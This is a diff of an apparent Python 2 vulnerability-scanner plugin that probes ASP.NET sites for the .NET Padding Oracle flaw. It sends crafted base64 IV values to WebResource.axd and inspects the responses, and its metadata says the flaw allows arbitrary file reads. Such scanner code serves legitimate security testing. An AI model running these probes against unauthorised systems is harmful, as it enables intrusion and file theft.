@@ -1,11 +1,24 @@
 # coding=utf-8
 import base64
-import urllib.request as ur
+import urllib2
 
-#攻击者通过此漏洞最终可以达到任意文件读取的效果。
-def check(url, timeout):
+def get_plugin_info():
+    plugin_info = {
+        "name": ".NET Padding Oracle信息泄露",
+        "info": "攻击者通过此漏洞最终可以达到任意文件读取的效果。",
+        "level": "高危",
+        "type": "任意文件读取",
+        "author": "wolf@YSRC",
+        "url": "",
+        "keyword": "tag:aspx",
+        "source": 1
+    }
+    return plugin_info
+
+def check(ip, port, timeout):
     try:
-        res_html = ur.urlopen(url, timeout=timeout).read()
+        url = 'http://' + ip + ":" + str(port)
+        res_html = urllib2.urlopen(url, timeout=timeout).read()
         if 'WebResource.axd?d=' in res_html:
             error_i = 0
             bglen = 0
@@ -15,14 +28,14 @@ def check(url, timeout):
                 enstr = base64.b64encode(IV).replace('=', '').replace('/', '-').replace('+', '-')
                 exp_url = "%s/WebResource.axd?d=%s" % (url, enstr + bgstr)
                 try:
-                    request = ur.Request(exp_url)
-                    res = ur.urlopen(request, timeout=timeout)
+                    request = urllib2.Request(exp_url)
+                    res = urllib2.urlopen(request, timeout=timeout)
                     res_html = res.read()
                     res_code = res.code
-                except ur.HTTPError, e:
+                except urllib2.HTTPError, e:
                     res_html = e.read()
                     res_code = e.code
-                except ur.URLError, e:
+                except urllib2.URLError, e:
                     error_i += 1
                     if error_i >= 3: return
                 except:
